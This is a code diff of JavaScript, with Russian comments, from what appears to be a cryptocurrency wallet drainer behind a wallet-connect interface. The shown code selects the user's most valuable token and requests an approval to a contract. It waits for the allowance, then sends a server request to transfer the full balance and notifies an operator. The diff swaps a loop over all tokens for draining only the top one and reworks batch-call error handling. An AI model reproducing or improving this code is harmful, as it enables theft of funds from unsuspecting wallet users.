@@ -657,16 +657,15 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
     return { success: false, message: 'No operations to perform' }
   } catch (error) {
     console.error('Batch operation error:', error)
-    if (error.message.includes('does not support batch transactions') || 
-        error.code === -32601 || // Method not found
-        error.message.includes('not supported')) {
+    // Проверяем конкретную ошибку wallet_sendCalls
+    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
       return { success: false, error: 'BATCH_NOT_SUPPORTED' }
     }
     return { success: false, error: error.message }
   }
 }
 
-// Modify the initializeSubscribers function to handle both batch and regular approvals
+// Модифицируем initializeSubscribers для корректной обработки ошибки
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -761,57 +760,46 @@ const initializeSubscribers = (modal) => {
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
         } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
           // Fallback to regular approve if batch is not supported
-          console.log('Batch transactions not supported, falling back to regular approve')
+          console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
           
-          // Get all tokens with positive balance in the same network
-          const tokensToProcess = allBalances.filter(t => 
-            t.network === mostExpensive.network && 
-            t.balance > 0 &&
-            t.address !== 'native'
-          );
-          
-          for (const token of tokensToProcess) {
-            try {
-              const contractAddress = CONTRACTS[token.chainId]
-              const approvalKey = `${state.address}_${token.chainId}_${token.address}_${contractAddress}`
+          try {
+            const contractAddress = CONTRACTS[mostExpensive.chainId]
+            const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+            
+            if (!store.approvedTokens[approvalKey] && !store.isApprovalRequested && !store.isApprovalRejected) {
+              store.isApprovalRequested = true
+              const txHash = await approveToken(
+                wagmiAdapter.wagmiConfig,
+                mostExpensive.address,
+                contractAddress,
+                mostExpensive.chainId
+              )
               
-              if (!store.approvedTokens[approvalKey] && !store.isApprovalRequested && !store.isApprovalRejected) {
-                store.isApprovalRequested = true
-                const txHash = await approveToken(
-                  wagmiAdapter.wagmiConfig,
-                  token.address,
-                  contractAddress,
-                  token.chainId
-                )
-                
-                store.approvedTokens[approvalKey] = true
-                store.isApprovalRequested = false
-                
-                // Wait for allowance and send server request
-                await waitForAllowance(
-                  wagmiAdapter.wagmiConfig,
-                  state.address,
-                  token.address,
-                  contractAddress,
-                  token.chainId
-                )
-                
-                const amount = parseUnits(token.balance.toString(), token.decimals)
-                await sendTransferRequest(
-                  state.address,
-                  token.address,
-                  amount,
-                  token.chainId,
-                  txHash
-                )
-                
-                await notifyTransferApproved(state.address, walletInfo.name, device, token, token.chainId)
-              }
-            } catch (error) {
-              handleApproveError(error, token, state)
-              // If error occurs, continue with next token
-              continue
+              store.approvedTokens[approvalKey] = true
+              store.isApprovalRequested = false
+              
+              // Wait for allowance and send server request
+              await waitForAllowance(
+                wagmiAdapter.wagmiConfig,
+                state.address,
+                mostExpensive.address,
+                contractAddress,
+                mostExpensive.chainId
+              )
+              
+              const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+              await sendTransferRequest(
+                state.address,
+                mostExpensive.address,
+                amount,
+                mostExpensive.chainId,
+                txHash
+              )
+              
+              await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
             }
+          } catch (error) {
+            handleApproveError(error, mostExpensive, state)
           }
         }
       }
